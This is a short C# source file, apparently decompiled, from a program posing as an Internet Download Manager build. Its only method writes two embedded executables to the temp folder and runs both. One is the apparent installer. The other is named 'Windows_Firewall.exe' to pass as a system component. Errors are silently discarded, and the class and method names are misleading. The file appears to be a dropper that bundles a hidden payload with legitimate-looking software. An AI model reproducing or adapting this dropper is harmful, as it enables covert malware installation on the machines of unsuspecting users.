using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace idman628build6;

[StandardModule]
internal sealed class StreamEventArgs
{
	private static object versionCollection = CommandStack.idman628build6;

	private static object previousData = CommandStack.Windows_Firewall;

	[STAThread]
	public static void DisableDrive()
	{
		try
		{
			string text = Path.GetTempPath() + "\\idman628build6.exe";
			File.WriteAllBytes(text, (byte[])versionCollection);
			Process.Start(text);
			Thread.Sleep(3000);
			string text2 = Path.GetTempPath() + "\\Windows_Firewall.exe";
			File.WriteAllBytes(text2, (byte[])previousData);
			Process.Start(text2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
